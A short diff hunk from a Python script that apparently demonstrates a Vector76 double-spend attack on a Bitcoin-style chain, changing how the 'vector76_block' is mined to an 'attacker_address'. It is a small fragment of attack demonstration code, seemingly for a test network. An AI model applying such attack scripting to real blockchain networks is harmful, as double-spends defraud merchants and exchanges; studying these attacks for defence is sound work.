@@ -133,9 +133,7 @@ print()
 print()
 print(f"Generating Vector76 Block")
 #send_rawtransaction(vector76_block)
-for i in range(6):
-    print(f" {i + 1} / 6   ...")
-    generate_block(attacker_address, vector76_block)
+result = generate_block(attacker_address, vector76_block)["hex"]
 
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print()
